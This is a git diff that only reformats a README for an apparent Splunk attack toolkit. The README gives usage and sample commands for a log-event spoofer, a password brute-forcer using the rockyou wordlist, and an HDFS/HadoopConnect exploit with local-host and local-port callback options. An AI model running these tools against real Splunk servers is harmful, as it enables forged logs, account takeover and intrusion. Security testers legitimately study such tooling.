@@ -2,23 +2,24 @@
 
 [i] Splunk forward spoofer v0.1
 
-USAGE: ./spooforward.py [options]:
-
-	-r, --host <file>	Server address (indexer instance)
-	-p, --port <address>	Server port (default: 9997)
-	-s, --source <pid>	Spoofed source ex. udp:514
-	-l, --shost <num>	Spoofed host address
-	-t, --type <type>	Source type
-	-i, --index <index>	Index to forward to ex. default, main
-	-m, --message <message>	 Spoofed event content (limit: 255)
-	-d, --debug	 Enable debugging
-	-c, --check	 Scan host
-	-h, --help	 This help message
+>USAGE: ./spooforward.py [options]:
+>
+>	-r, --host <file>	Server address (indexer instance)
+>	-p, --port <address>	Server port (default: 9997)
+>	-s, --source <pid>	Spoofed source ex. udp:514
+>	-l, --shost <num>	Spoofed host address
+>	-t, --type <type>	Source type
+>	-i, --index <index>	Index to forward to ex. default, main
+>	-m, --message <message>	 Spoofed event content (limit: 255)
+>	-d, --debug	 Enable debugging
+>	-c, --check	 Scan host
+>	-h, --help	 This help message
 
 
 Example:
 
-```▶ ~/DEV/splunk_tools ◀
+```bash
+▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./spooforward.py -c -d -r 127.0.0.1 -l spoofedaddr.net -i main -t spoofedtype -s spoofedsource  -m "some event message"
 
 [i] Splunk forward spoofer v0.1
@@ -37,7 +38,8 @@ root@postern ⌁ ./spooforward.py -c -d -r 127.0.0.1 -l spoofedaddr.net -i main 
 
 ## [splunk_brute.sh]
 
-```▶ ~/DEV/splunk_tools ◀
+```bash
+▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./splunk_brute.sh test_acc /usr/share/wordlists/rockyou.txt 127.0.0.1 8000
 
 [!] Bruteforcing password for test_acc on 127.0.0.1...
@@ -59,23 +61,24 @@ This exploit need to meet several requirements:
 * Ability to craft logs on system (see spooforward.py)
 * Have HadoopConnect app installed
 
-Usage:
-        case "${option}"
-        in
-                h) rhost=${OPTARG};; # Remote host
-                p) rport=${OPTARG};; # Remote port
-                l) lhost=${OPTARG};; # Local host
-                s) lport=${OPTARG};; # Local port
-		o) proto=${OPTARG};; # Protocol [http|https]
-		m) marker=${OPTARG};;# Unique string to search for
-		u) uname=${OPTARG};; # Splunk user
-		w) passw=${OPTARG};; # Splunk password
-		c) scanhost="-c";;   # Scan host for spoofing capabilities
-		e) spoof="NO";;      # Dont try to spoof event (already there)
+>Usage:
+>        case "${option}"
+>        in
+>                h) rhost=${OPTARG};; # Remote host
+>                p) rport=${OPTARG};; # Remote port
+>                l) lhost=${OPTARG};; # Local host
+>                s) lport=${OPTARG};; # Local port
+>		o) proto=${OPTARG};; # Protocol [http|https]
+>		m) marker=${OPTARG};;# Unique string to search for
+>		u) uname=${OPTARG};; # Splunk user
+>		w) passw=${OPTARG};; # Splunk password
+>		c) scanhost="-c";;   # Scan host for spoofing capabilities
+>		e) spoof="NO";;      # Dont try to spoof event (already there)
 
 
 
-```▶ ~/DEV/splunk_tools ◀
+```bash
+▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./hdfs_exploit.sh -c -h 127.0.0.1 -m w00tw00tw00t
 
 [i] Splunk forward spoofer v0.1
